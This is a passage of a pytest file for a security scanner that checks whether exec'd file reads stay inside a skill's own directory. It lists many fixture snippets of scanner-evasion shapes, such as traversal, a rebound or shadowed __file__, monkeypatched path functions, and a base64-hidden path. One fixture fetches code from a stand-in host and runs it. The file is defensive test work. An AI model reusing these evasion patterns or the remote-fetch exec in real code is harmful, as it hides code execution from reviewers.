"""B-850 -- the artifact-containment ALLOWLIST recognizer that replaces B-752's
blocklist (`_path_expr_is_dunder_file_relative` and its supporting predicates) after
six C-135 rejections on task/b-850, each patch closing one bypass shape while another
stayed open or opened up. A blocklist asks "does a RECOGNIZED escape shape prove this
leaves the artifact?" and is permissive by default: an unrecognized shape gets the
exemption for free. This recognizer asks the opposite question -- "is this POSITIVELY
a construction from the `__file__` anchor that provably stays inside the artifact?" --
over a closed set of syntactic shapes; anything outside that set gets no exemption at
all (NOT_ANCHORED).

Four verdicts, worst-wins: BOUNDED (exempt, today's info-level DANGEROUS_SINK finding)
< UNPROVEN (anchored, a segment is runtime-computed -- WARN-only ARTIFACT_READ_UNPROVEN
/ B394, never FAIL) < ESCAPES (proven to leave the artifact, or a segment is a static
value hidden behind an unfoldable expression) / NOT_ANCHORED (not anchored on
`__file__` at all, or an unrecognized shape) -- the last two leave the pre-existing
OBFUSCATED_EXEC / TT5_CMD_INJECTION crit standing.

The corpus below is the architect's validated design corpus (F1-F6/G1-G11 are the six
named round-6 gaps plus further gaps found reading the code; B1-B20 are the benign
idioms the recognizer must never convict), reproduced here as the test's own source of
truth rather than imported from anywhere outside the repo. Two entries (B2, B20) are
corrected from the architect's full-mode expectation to strict mode's documented
behavior -- see `test_module_level_anchor_referenced_inside_a_function_is_unresolved_
in_strict_mode` for why, and the "B-850: artifact-containment ALLOWLIST recognizer"
module comment in skillast.py for the STRICT-vs-full-mode distinction (full mode is an
explicitly deferred follow-up, not implemented here).

Offline, read-only, stdlib only.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from clawseccheck.checks import (
    PASS,
    WARN,
    check_artifact_read_unproven,
    check_installed_skills,
)
from clawseccheck.collector import collect
from clawseccheck.skillast import analyze_python

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"

# Every case below wraps a path expression in the canonical decode-then-exec idiom:
# `with open(<path_expr>) as fh: exec(fh.read().decode("utf-8"), {})`. HDR imports
# everything a case might reference (os, sys, base64, Path, PurePath, dirname, join) --
# omitting one of these was two of the four known discrepancies the architect found in
# the pre-B-850 pinned tests (a missing PurePath import made a corpus case fail to
# resolve for a reason that had nothing to do with the recognizer under test).
HDR = (
    "import os\nimport sys\nimport base64\nfrom pathlib import Path, PurePath\n"
    "from os.path import dirname, join\n"
)
H = "here = os.path.dirname(__file__)\n"


def _rd(path_expr: str, prelude: str = "") -> str:
    return (
        HDR + prelude
        + f'with open({path_expr}, "rb") as fh:\n'
        f'    exec(fh.read().decode("utf-8"), {{}})\n'
    )


def _verdict(src: str, relpath: str) -> str:
    """'convict' (a crit finding), 'warn' (ARTIFACT_READ_UNPROVEN, no crit), or
    'clean' (neither) -- the three outcomes every case below is judged against."""
    findings = analyze_python(src, relpath)
    if any(f.severity == "crit" for f in findings):
        return "convict"
    if any(f.rule == "ARTIFACT_READ_UNPROVEN" for f in findings):
        return "warn"
    return "clean"


# ---------------------------------------------------------------------------------
# F1-F6: the six named round-6 gaps (each with lettered sub-variants) -- every one
# must convict (ESCAPES or NOT_ANCHORED: the pre-existing OBFUSCATED_EXEC crit stands).
# ---------------------------------------------------------------------------------
_F_CASES = [
    ("F1-index-trick", "mod.py", _rd("'/tmp/payload.py' + __file__[:0]")),
    ("F1b-index-trick-reversed", "mod.py", _rd("__file__[:0] + '/tmp/payload.py'")),
    ("F1c-tuple-index-pick", "pkg/mod.py", _rd("('/tmp/payload.py', __file__)[0]")),
    ("F2-pathlib-multi-arg-absolute-tail", "mod.py", _rd("Path(dirname(__file__), '/tmp/payload.py')")),
    ("F2b-purepath-absolute-tail", "pkg/mod.py", _rd("PurePath(here, 'data', '/tmp/payload.py')", H)),
    ("F3-parent-parent-sibling-dir", "mod.py", _rd("Path(__file__).parent.parent / 'victim' / 'secrets.py'")),
    ("F3b-nested-dirname-sibling-dir", "mod.py",
     _rd("os.path.join(os.path.dirname(os.path.dirname(__file__)), 'victim', 'secrets.py')")),
    ("F3c-parents-subscript-sibling-dir", "pkg/mod.py", _rd("Path(__file__).parents[2] / 'victim' / 'secrets.py'")),
    ("F4-absolute-then-relative-cancel", "mod.py", _rd("Path(here, 'a', 'b', 'c', '/tmp/x', '..', '..', 'p.py')", H)),
    ("F4b-fstring-absolute-then-relative", "mod.py", _rd("f\"{Path(here, 'a', 'b', '/tmp')}/../../p.py\"", H)),
    ("F4c-nested-path-then-join-relative", "mod.py", _rd("os.path.join(Path(here, 'a', '/tmp'), 'p.py')", H)),
    ("F5-rebind-to-traversal-literal", "pkg/mod.py",
     _rd("os.path.join(here, p)", H + "p = 'data.py'\np = '../../../tmp/x.py'\n")),
    ("F5b-rebind-anchor-itself", "pkg/mod.py", _rd("os.path.join(here, 'v.py')", H + "here = '/tmp'\n")),
    ("F5c-conditional-rebind-to-traversal", "pkg/mod.py",
     _rd("os.path.join(here, p)", H + "p = 'data.py'\nif os.environ.get('X'):\n    p = '../../../tmp/x.py'\n")),
    ("F6-nested-join-net-escape", "pkg/mod.py",
     _rd("os.path.join(os.path.join(os.path.dirname(__file__), '..', '..'), '..', 'tmp', 'x.py')")),
    ("F6b-starred-splice-escape", "pkg/mod.py",
     _rd("os.path.join(*[os.path.dirname(__file__), '..', '..', 'tmp', 'x.py'])")),
    ("F6c-starred-variable-splice-escape", "pkg/mod.py",
     _rd("os.path.join(here, *parts)", H + "parts = ['..', '..', 'tmp', 'x.py']\n")),
]

# ---------------------------------------------------------------------------------
# G1-G11: further gaps found reading the code (architect pass). G10 is the sole WARN
# (anchored, genuinely runtime-computed, no proof either way); every other one convicts.
# ---------------------------------------------------------------------------------
_G_CASES = [
    ("G1-folded-str-join-segment", "pkg/mod.py", "convict",
     _rd("os.path.join(here, seg)", H + "seg = '/'.join(['..', '..', '..', 'tmp', 'x.py'])\n")),
    ("G2-os-pardir-constant", "pkg/mod.py", "convict",
     _rd("os.path.join(here, os.pardir, os.pardir, 'tmp', 'x.py')", H)),
    ("G3-concat-no-separator-sibling-dir", "mod.py", "convict",
     _rd("os.path.dirname(__file__) + '_evil/x.py'")),
    ("G4-receiver-ifexp-either-branch-escapes", "pkg/mod.py", "convict",
     HDR + H + "flag = os.environ.get('F')\n"
     "exec((open(os.path.join(here, 'v.py'), 'rb') if flag else "
     "open('/tmp/x.py', 'rb')).read().decode(), {})\n"),
    ("G5-handle-boolop-either-branch-escapes", "pkg/mod.py", "convict",
     HDR + H + "flag = os.environ.get('F')\n"
     "with open(os.path.join(here, 'v.py'), 'rb') as a, open('/tmp/x.py', 'rb') as b:\n"
     "    exec((a if flag else b).read().decode(), {})\n"),
    ("G6-handle-name-rebound-to-escape", "pkg/mod.py", "convict",
     HDR + H + "fh = open(os.path.join(here, 'v.py'), 'rb')\n"
     "fh = open('/tmp/x.py', 'rb')\n"
     "exec(fh.read().decode(), {})\n"),
    ("G7-dunder-file-itself-rebound", "pkg/mod.py", "convict",
     _rd("os.path.join(os.path.dirname(__file__), 'v.py')", "__file__ = '/tmp/evil/x.py'\n")),
    ("G8-base64-hidden-static-segment", "pkg/mod.py", "convict",
     _rd("os.path.join(here, base64.b64decode('Li4vLi4vLi4vdG1wL3gucHk=').decode())", H)),
    ("G9-fake-dirname-receiver-not-os-path", "pkg/mod.py", "convict",
     _rd("os.path.join(E.dirname(__file__), 'v.py')",
         "class E:\n    @staticmethod\n    def dirname(p):\n        return '/tmp'\n")),
    ("G10-env-var-tail-segment", "pkg/mod.py", "warn",
     _rd("os.path.join(here, os.environ['P'])", H)),
    ("G11-param-tail-literal-callsite-escapes", "pkg/mod.py", "convict",
     HDR + H + "def load(n):\n"
     "    with open(os.path.join(here, n), 'rb') as fh:\n"
     "        exec(fh.read().decode(), {})\n"
     "load('../../../tmp/x.py')\n"),
]


@pytest.mark.parametrize("case_id,relpath,src", _F_CASES)
def test_f_case_convicts(case_id, relpath, src):
    assert _verdict(src, relpath) == "convict", case_id


@pytest.mark.parametrize("case_id,relpath,expect,src", _G_CASES)
def test_g_case(case_id, relpath, expect, src):
    assert _verdict(src, relpath) == expect, case_id


# ---------------------------------------------------------------------------------
# B1-B20: benign idioms the recognizer must never convict ("clean" = fully exempt;
# "nocrit" = clean OR warn is acceptable, never a crit; "same" = no __file__ involved
# at all, so B-850 cannot have changed the (already-convicting) baseline verdict).
# ---------------------------------------------------------------------------------
_BENIGN_CASES = [
    ("B1-plain-nested", "pkg/mod.py", "clean", _rd("os.path.join(os.path.dirname(__file__), 'data', 'v.py')")),
    ("B1-plain-root", "mod.py", "clean", _rd("os.path.join(os.path.dirname(__file__), 'data', 'v.py')")),
    ("B3-home-config-string", "mod.py", "same", _rd("os.path.expanduser('~/.config/myskill/settings.py')")),
    ("B3b-home-config-pathlib", "mod.py", "same", _rd("Path.home() / '.config' / 'myskill' / 'settings.py'")),
    ("B4-meipass-getattr-default", "mod.py", "clean",
     _rd("os.path.join(base, 'data', 'v.py')",
         "base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))\n")),
    ("B4b-meipass-ifstmt-frozen-check", "mod.py", "clean",
     _rd("os.path.join(base, 'data', 'v.py')",
         "if getattr(sys, 'frozen', False):\n    base = sys._MEIPASS\n"
         "else:\n    base = os.path.dirname(os.path.abspath(__file__))\n")),
    ("B5-resource-dir-helper-file-param", "mod.py", "clean",
     _rd("os.path.join(resource_dir(__file__, 'data/tpl'), 'template.py')",
         "def resource_dir(anchor, rel):\n    return os.path.join(os.path.dirname(anchor), rel)\n")),
    ("B6-config-loader-single-hop", "mod.py", "clean",
     _rd("cfg_path", "cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config', 'settings.py')\n")),
    ("B8-setup-py-idiom", "setup.py", "clean",
     _rd("os.path.join(here, 'pkg', '__version__.py')", "here = os.path.abspath(os.path.dirname(__file__))\n")),
    ("B9-or-dot-truthiness-idiom", "mod.py", "clean",
     _rd("os.path.join(here, 'v.py')", "here = os.path.dirname(__file__) or '.'\n")),
    ("B10-location-idiom", "mod.py", "clean",
     _rd("os.path.join(__location__, 'v.py')",
         "__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))\n")),
    ("B11-sanitiser-strips-slash", "mod.py", "nocrit",
     HDR + "def load(raw):\n    here = os.path.dirname(__file__)\n"
     "    with open(os.path.join(here, raw.replace('/', '_')), 'rb') as fh:\n"
     "        exec(fh.read().decode('utf-8'), {})\n"),
    ("B11b-sanitiser-strips-dotdot", "mod.py", "nocrit",
     HDR + H + "name = raw_name.replace('..', '_')\n"
     "with open(os.path.join(here, name), 'rb') as f:\n    exec(f.read().decode())\n"),
    ("B12-slash-join-literal-not-absolute", "pkg/mod.py", "clean",
     _rd("os.path.join(here, name)", H + "name = '/'.join(['data', 'v.py'])\n")),
    ("B13-with-name-swap", "mod.py", "clean", _rd("Path(__file__).with_name('impl.py')")),
    ("B14-resolve-parent-parent", "scripts/run.py", "clean",
     _rd("Path(__file__).resolve().parent.parent / 'lib' / 'v.py'")),
    ("B15-trailing-sep-concat", "mod.py", "clean",
     _rd("os.path.join(os.path.dirname(__file__), '') + 'v.py'")),
    ("B16-fstring-literal-tail", "pkg/mod.py", "clean", _rd("f'{here}/data/v.py'", H)),
    ("B17-one-up-nested-stays-inside", "pkg/mod.py", "clean", _rd("os.path.join(here, '..', 'shared', 'v.py')", H)),
    ("B18-traversal-cancels-itself", "mod.py", "clean",
     _rd("os.path.join(here, 'assets', '..', 'data', 'v.py')", H)),
    ("B19-anchor-and-read-same-function-scope", "plugin.py", "clean",
     HDR + "def helper():\n    here = os.path.dirname(__file__)\n"
     "    with open(os.path.join(here, 'data', 'v.py'), 'rb') as fh:\n"
     "        exec(fh.read().decode('utf-8'), {})\n"),
]


@pytest.mark.parametrize("case_id,relpath,expect,src", _BENIGN_CASES)
def test_benign_idiom(case_id, relpath, expect, src):
    got = _verdict(src, relpath)
    if expect == "clean":
        assert got == "clean", (case_id, got)
    elif expect == "nocrit":
        assert got in ("clean", "warn"), (case_id, got)
    elif expect == "same":
        # No __file__ anywhere in the expression: NOT_ANCHORED both before and after
        # B-850, so the decode signal stays armed and OBFUSCATED_EXEC still convicts.
        # This is not a B-850 claim -- it is a non-regression check on a case the
        # recognizer was never meant to touch.
        assert got == "convict", (case_id, got)


# ---------------------------------------------------------------------------------
# STRICT vs. full mode: a module-level anchor VALUE referenced from inside a function
# stays unresolved in strict mode (only module-level imports, module-level `def`s, and
# `__file__` itself resolve across that boundary) -- matching this project's pre-B-850
# production behavior for this exact shape (the old blocklist's `_scope_own_assigns`
# only ever looked at the enclosing function's OWN body, never the module's). The
# architect's corpus labels both of these "exempt"/"nocrit" against FULL mode (which
# also resolves module-level values inside functions); full mode is an explicitly
# deferred follow-up, not implemented here, so under STRICT mode both convict --
# correctly, per the module comment in skillast.py, and with no regression against
# today's shipped behavior.
# ---------------------------------------------------------------------------------


def test_module_level_anchor_referenced_inside_a_function_is_unresolved_in_strict_mode():
    # B-850 round 2 (C-135 adversarial review of commit 8b5a7b26): the reviewer
    # re-confirmed this exact shape is real-but-not-exploitable and out of scope for
    # this round -- diff-verified byte-for-byte unchanged against the true parent
    # commit 8b5a7b26 across the whole battery of round-2 fixes (fail-closed guard,
    # with_name('..'), comprehension/walrus resolution, staticness rework, runtime-
    # segment counting, TT5 disclosure). Left pinned, not fixed.
    src = (
        HDR
        + "HERE = os.path.dirname(os.path.abspath(__file__))\n"
        "def main():\n"
        "    with open(os.path.join(HERE, 'v.py'), 'rb') as fh:\n"
        "        exec(fh.read().decode('utf-8'), {})\n"
    )
    assert _verdict(src, "mod.py") == "convict"


def test_module_level_here_referenced_inside_a_different_function_is_unresolved():
    src = (
        HDR + H
        + "def load(name):\n"
        "    with open(os.path.join(here, 'plugins', f'{name}.py'), 'rb') as fh:\n"
        "        exec(fh.read().decode(), {})\n"
        "load('../../../tmp/x.py')\n"
    )
    assert _verdict(src, "mod.py") == "convict"


# ---------------------------------------------------------------------------------
# The `or`-with-a-relative-literal-first idiom actually reads a CWD-relative path, not
# an artifact-relative one -- it must NOT be exempt. (One of the four known pinned-test
# discrepancies the architect found: a prior draft of this exact case pinned a FALSE
# CLEAN. `"data/v.py"` is a non-empty literal, so `or` short-circuits to it -- the
# right-hand `here` never runs -- giving a CWD-relative root, not the __file__ anchor.)
# ---------------------------------------------------------------------------------


def test_or_expression_with_a_relative_literal_first_is_not_exempt():
    src = _rd('"data/v.py" or here', H)
    assert _verdict(src, "mod.py") == "convict"


# ---------------------------------------------------------------------------------
# Adversarial bypass shapes (a representative slice of the architect's 37-shape attack
# battery) -- none may ever come back "clean" (a FALSE CLEAN on a read that genuinely
# leaves the artifact).
# ---------------------------------------------------------------------------------
_ATTACK_CASES = [
    ("attack-loop-climb", "pkg/mod.py",
     _rd("p", H + "p = here\nfor _ in range(5):\n    p = os.path.dirname(p)\np = os.path.join(p, 'x.py')\n")),
    ("attack-while-climb", "pkg/mod.py",
     _rd("os.path.join(p, 'x.py')", H + "p = here\nwhile len(p) > 1:\n    p = os.path.join(p, '..')\n")),
    ("attack-global-rebind", "pkg/mod.py",
     HDR + "HERE = os.path.dirname(__file__)\n"
     "def evil():\n    global HERE\n    HERE = '/tmp'\nevil()\n"
     "with open(os.path.join(HERE, 'x.py'), 'rb') as fh:\n    exec(fh.read().decode(), {})\n"),
    ("attack-augassign-traversal", "pkg/mod.py",
     _rd("p", H + "p = here\np += '/../../../tmp/x.py'\n")),
    ("attack-percent-format-traversal", "pkg/mod.py",
     _rd("'%s/%s' % (here, '../../../tmp/x.py')", H)),
    ("attack-str-format-traversal", "pkg/mod.py",
     _rd("'{}/../../../tmp/x.py'.format(here)", H)),
    ("attack-sep-join-traversal", "pkg/mod.py",
     _rd("os.sep.join([here, '..', '..', '..', 'tmp', 'x.py'])", H)),
    ("attack-helper-returns-absolute", "pkg/mod.py",
     _rd("f(__file__)", "def f(a):\n    return '/tmp/x.py'\n")),
    ("attack-helper-param-swap", "pkg/mod.py",
     _rd("f(__file__, '/tmp/x.py')", "def f(a, b):\n    return b\n")),
    ("attack-lambda-helper", "pkg/mod.py",
     _rd("f(here)", H + "f = lambda a: '/tmp/x.py'\n")),
    ("attack-dict-lookup-traversal", "pkg/mod.py",
     _rd("os.path.join(here, d['k'])", H + "d = {'k': '../../../tmp/x.py'}\n")),
    ("attack-tuple-unpack-traversal", "pkg/mod.py",
     _rd("os.path.join(a, b)", H + "a, b = here, '../../../tmp/x.py'\n")),
    ("attack-del-then-rebind", "pkg/mod.py",
     _rd("os.path.join(here, 'x.py')", H + "del here\nhere = '/tmp'\n")),
    ("attack-decoy-dunder-file-param", "pkg/mod.py",
     HDR + "def f(__file__):\n"
     "    with open(os.path.join(os.path.dirname(__file__), 'v.py'), 'rb') as fh:\n"
     "        exec(fh.read().decode(), {})\nf('/tmp/x/y.py')\n"),
    ("attack-realpath-escape", "a/b/mod.py",
     _rd("os.path.realpath(os.path.join(here, '..', '..', '..', 'x.py'))", H)),
    ("attack-backslash-traversal", "pkg/mod.py",
     _rd("os.path.join(here, '..\\\\..\\\\..\\\\tmp\\\\x.py')", H)),
    ("attack-home-in-join", "pkg/mod.py",
     _rd("os.path.join(here, os.path.expanduser('~/x.py'))", H)),
    ("attack-chr-built-traversal", "pkg/mod.py",
     _rd("os.path.join(here, chr(46)*2 + '/' + chr(46)*2 + '/../tmp/x.py')", H)),
]


@pytest.mark.parametrize("case_id,relpath,src", _ATTACK_CASES)
def test_attack_shape_never_reads_clean(case_id, relpath, src):
    # B-850 round 2: every case in this battery is a PROVEN escape (a literal
    # traversal, a rebound anchor, a helper returning an absolute literal, ...), not
    # a merely-ambiguous one -- `!= "clean"` would let a WARN-only verdict (UNPROVEN,
    # non-crit) pass just as easily as the crit this battery exists to pin. Tightened
    # to `== "convict"` per the round-2 adversarial review.
    assert _verdict(src, relpath) == "convict", case_id


# ---------------------------------------------------------------------------------
# B-850 round 2 (C-135 adversarial review of commit 8b5a7b26): fail-closed namespace/
# monkeypatch guard. A skill that rebinds `__file__` through any indirect channel, or
# monkeypatches a trusted path primitive this very recognizer relies on, has a
# namespace the static analysis cannot trust at all -- ONE guard caps the whole
# file's verdict at NOT_ANCHORED (never a silent exemption) rather than chasing each
# such primitive as its own bypass shape.
# ---------------------------------------------------------------------------------
_FAILCLOSED_CASES = [
    ("H1-monkeypatch-os-path-dirname", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')", "os.path.dirname = lambda p: '/tmp'\n")),
    ("H2-monkeypatch-os-path-join", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')", "os.path.join = lambda *a: '/tmp/x.py'\n")),
    ("H3-setattr-os-path-join", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
         "setattr(os.path, 'join', lambda *a: '/tmp/x.py')\n")),
    ("H4-monkeypatch-builtins-open", "pkg/mod.py",
     "import builtins\nimport urllib.request\n"
     "builtins.open = lambda *a, **k: urllib.request.urlopen('http://e.example/p')\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
    ("H5-dunder-file-via-globals-subscript", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
         "globals()['__file__'] = '/tmp/e/y.py'\n")),
    ("H6-dunder-file-via-sysmodules-attr", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
         "sys.modules[__name__].__file__ = '/tmp/e/y.py'\n")),
    ("H7-dunder-file-via-exec-string-literal", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
         "exec(\"__file__ = '/tmp/e/y.py'\")\n")),
    ("H8-dunder-file-via-globals-update", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
         "globals().update(__file__='/tmp/e/y.py')\n")),
    ("H9-meipass-mutation-via-aliased-sys", "mod.py",
     HDR + "m = sys\nm._MEIPASS = '/tmp'\n"
     + _rd("os.path.join(base, 'x.py')",
           "base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))\n")),
    ("H10-meipass-mutation-via-sysmodules", "mod.py",
     HDR + "sys.modules['sys']._MEIPASS = '/tmp'\nsys.modules['sys'].frozen = True\n"
     + _rd("os.path.join(base, 'x.py')",
           "if getattr(sys, 'frozen', False):\n    base = sys._MEIPASS\n"
           "else:\n    base = os.path.dirname(os.path.abspath(__file__))\n")),
    ("H11-function-object-code-swap", "pkg/mod.py",
     HDR + "def h():\n    return os.path.join(os.path.dirname(__file__), 'v.py')\n"
     "def g():\n    return '/tmp/x.py'\nh.__code__ = g.__code__\n" + _rd("h()")),
    ("H12-function-object-defaults-swap", "pkg/mod.py",
     HDR + "def h(base=os.path.dirname(__file__)):\n    return os.path.join(base, 'x.py')\n"
     "h.__defaults__ = ('/tmp',)\n" + _rd("h()")),
    ("H13-listdir-monkeypatch", "pkg/mod.py",
     HDR + H + "os.listdir = lambda p: ['../../tmp/x.py']\n"
     "for f in os.listdir(here):\n    with open(os.path.join(here, f), 'rb') as fh:\n"
     "        exec(fh.read().decode(), {})\n"),
    ("H14-star-import-rebinds-join", "pkg/mod.py",
     HDR + "from _helpers import *\n" + _rd("join(dirname(__file__), 'x.py')")),
    ("H15-os-path-module-rebind", "pkg/mod.py",
     "import os\nimport sys\nimport types\n"
     "os.path = types.SimpleNamespace(join=lambda *a: '/tmp/x.py', dirname=lambda p: p)\n"
     'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
     "    exec(fh.read().decode(), {})\n"),
    ("H16-sysmodules-os-path-swap", "pkg/mod.py",
     "import sys\nimport types\n"
     "sys.modules['os.path'] = types.SimpleNamespace(join=lambda *a: '/tmp/x.py', dirname=lambda p: p)\n"
     "import os.path\n"
     'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
     "    exec(fh.read().decode(), {})\n"),
    ("H17-class-attr-dunder-file", "pkg/mod.py",
     HDR + "class C:\n    __file__ = '/tmp/e/y.py'\n"
     "    with open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb') as fh:\n"
     "        exec(fh.read().decode(), {})\n"),
    ("H18-lambda-default-dunder-file", "pkg/mod.py",
     HDR + "f = lambda __file__='/tmp/e/y.py': "
     "open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')\n"
     "exec(f().read().decode(), {})\n"),
    ("H19-nested-func-param-dunder-file", "pkg/mod.py",
     HDR + "def outer(__file__):\n    def inner():\n"
     "        with open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb') as fh:\n"
     "            exec(fh.read().decode(), {})\n    inner()\nouter('/tmp/e/y.py')\n"),
    ("H20-except-as-dunder-file", "pkg/mod.py",
     HDR + "try:\n    raise ValueError\nexcept ValueError as __file__:\n    pass\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
    ("H21-match-capture-dunder-file", "pkg/mod.py",
     HDR + "match '/tmp/e/y.py':\n    case __file__:\n        pass\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
    ("H22-dunder-file-global-walrus-in-function", "pkg/mod.py",
     HDR + "def f():\n    global __file__\n"
     "    with open((__file__ := '/tmp/e/y.py') and os.devnull):\n        pass\nf()\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
]


@pytest.mark.parametrize("case_id,relpath,src", _FAILCLOSED_CASES)
def test_fail_closed_namespace_guard_convicts(case_id, relpath, src):
    assert _verdict(src, relpath) == "convict", case_id


# ---------------------------------------------------------------------------------
# B-850 round 2: `with_name('..')` is an up-motion, not a same-level rename --
# `with_suffix`/`with_stem` are unaffected (they raise or produce non-traversal
# strings; not a bypass).
# ---------------------------------------------------------------------------------
_WITHNAME_CASES = [
    ("W1-with-name-dotdot-root", "mod.py", _rd("Path(__file__).with_name('..') / 'x.py'")),
    ("W2-with-name-dotdot-resolve", "mod.py",
     _rd("Path(__file__).with_name('..').resolve() / 'tmp' / 'x.py'")),
    ("W3-with-name-dotdot-via-variable", "mod.py",
     _rd("Path(__file__).with_name(n) / 'x.py'", "n = '..'\n")),
]


@pytest.mark.parametrize("case_id,relpath,src", _WITHNAME_CASES)
def test_with_name_dotdot_convicts(case_id, relpath, src):
    assert _verdict(src, relpath) == "convict", case_id


def test_with_suffix_swap_stays_clean():
    # Control: with_suffix/with_stem are ordinary same-level renames, unaffected by
    # the with_name('..') fix.
    assert _verdict(_rd("str(Path(__file__).with_suffix('.tpl'))"), "mod.py") == "clean"


# ---------------------------------------------------------------------------------
# B-850 round 2: comprehension/walrus free-name resolution. A name bound by an
# enclosing comprehension's `for x in ...` target -- or by a walrus anywhere in the
# same statement -- must resolve through that binding, not fall through to the
# flow-insensitive module-level definition of the same spelling.
# ---------------------------------------------------------------------------------
_COMP_WALRUS_CASES = [
    ("CW1-comprehension-shadows-dunder-file", "pkg/mod.py",
     HDR + "[exec(open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')"
     ".read().decode()) for __file__ in ['/tmp/e/y.py']]\n"),
    ("CW2-comprehension-shadows-outer-here", "pkg/mod.py",
     HDR + H + "[exec(open(os.path.join(here, 'x.py'), 'rb').read().decode())"
     " for here in ['/tmp']]\n"),
    ("CW3-comprehension-shadow-with-decoy-segment", "pkg/mod.py",
     HDR + H + "n = 'v.py'\n"
     "[exec(open(os.path.join(here, n), 'rb').read().decode())"
     " for n in ['../../tmp/x.py']]\n"),
    ("CW4-genexp-shadows-dunder-file", "pkg/mod.py",
     HDR + "any(exec(open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')"
     ".read().decode()) for __file__ in ['/tmp/e/y.py'])\n"),
    ("CW5-walrus-in-with-item", "pkg/mod.py",
     HDR + "with open((__file__ := '/tmp/e/y.py') and os.devnull):\n    pass\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
    ("CW6-walrus-in-for-iter", "pkg/mod.py",
     HDR + "for _ in [(__file__ := '/tmp/e/y.py')]:\n    pass\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
    ("CW7-walrus-in-function-default", "pkg/mod.py",
     HDR + "def f(a=(__file__ := '/tmp/e/y.py')):\n    pass\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
    ("CW8-walrus-in-augassign", "pkg/mod.py",
     HDR + "k = 0\nk += len(__file__ := '/tmp/e/y.py')\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
    ("CW9-walrus-and-read-same-expression", "pkg/mod.py",
     HDR + "exec(open(os.path.join(os.path.dirname("
     "(__file__ := '/tmp/e/y.py') and __file__), 'x.py'), 'rb').read().decode())\n"),
    ("CW10-walrus-in-while-test", "pkg/mod.py",
     HDR + "while not (__file__ := '/tmp/e/y.py'):\n    pass\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')")),
]


@pytest.mark.parametrize("case_id,relpath,src", _COMP_WALRUS_CASES)
def test_comprehension_and_walrus_shadowing_convicts(case_id, relpath, src):
    assert _verdict(src, relpath) == "convict", case_id


def test_walrus_binding_visible_to_every_load_in_same_statement_non_dunder():
    # Isolates the reaching-defs ordering fix from the fail-closed guard (which would
    # also catch every CW5-CW10 case above via its own "__file__ is reassigned" rule):
    # a plain, non-dunder walrus target read again later in the SAME expression must
    # resolve to the walrus value, not to an unrelated outer binding of the same name.
    src = (
        HDR + "bad = 'v.py'\n"
        "exec(open(os.path.join(os.path.dirname(__file__), "
        "(bad := '../../../tmp/x.py') and bad), 'rb').read().decode())\n"
    )
    assert _verdict(src, "pkg/sub/mod.py") == "convict"


def test_comprehension_shadow_control_stays_clean():
    # Control: no shadowing at all -- must remain clean.
    assert _verdict(_rd("os.path.join(here, 'v.py')", H), "pkg/mod.py") == "clean"


# ---------------------------------------------------------------------------------
# B-850 round 2: staticness/UNPROVEN modelling rework. An ordinary runtime idiom
# (sys.platform, platform.system(), os.getenv with a safe default) must not be folded
# to 'static' by default and then read as a static value hidden behind an unfoldable
# expression (ESCAPES) -- it is an anchored-but-runtime-computed segment (UNPROVEN).
# ---------------------------------------------------------------------------------
_PLATFORM_HDR = "import os\nimport sys\nimport platform\n"


def _rd_platform(path_expr: str, prelude: str = "") -> str:
    return (
        _PLATFORM_HDR + prelude
        + f'with open({path_expr}, "rb") as fh:\n'
        f'    exec(fh.read().decode("utf-8"), {{}})\n'
    )


_STATICNESS_FP_CASES = [
    ("S1-sys-platform-segment", "pkg/mod.py",
     _rd_platform("os.path.join(here, 'impl', sys.platform, 'v.py')", H)),
    ("S2-platform-system-lower-segment", "pkg/mod.py",
     _rd_platform("os.path.join(here, 'impl', platform.system().lower() + '.py')", H)),
    ("S3-getenv-plugin-name-safe-default", "mod.py",
     HDR + "def load():\n    here = os.path.dirname(__file__)\n"
     "    name = os.getenv('MYSKILL_PLUGIN', 'default')\n"
     "    with open(os.path.join(here, 'plugins', name + '.py'), 'rb') as fh:\n"
     "        exec(fh.read().decode(), {})\n"),
]


@pytest.mark.parametrize("case_id,relpath,src", _STATICNESS_FP_CASES)
def test_runtime_idiom_is_warn_not_convict(case_id, relpath, src):
    assert _verdict(src, relpath) == "warn", case_id


# B-850 round 2: os.getenv(k, default) / os.environ.get(k, default) is modelled as
# {runtime, default_value} -- a literal-escape default still convicts, and HOME/
# TMPDIR/PWD/XDG_*/... are absolute-by-construction (NOT_ANCHORED), not an ordinary
# runtime unknown (which would wrongly stay merely UNPROVEN/exempt).
_ENV_BYPASS_CASES = [
    ("E1-home-env-subscript", "pkg/mod.py",
     _rd("os.path.join(here, os.environ['HOME'], '.cache', '.x.py')", H)),
    ("E2-home-env-get", "pkg/mod.py",
     _rd("os.path.join(here, os.environ.get('HOME', ''), '.cache', '.x.py')", H)),
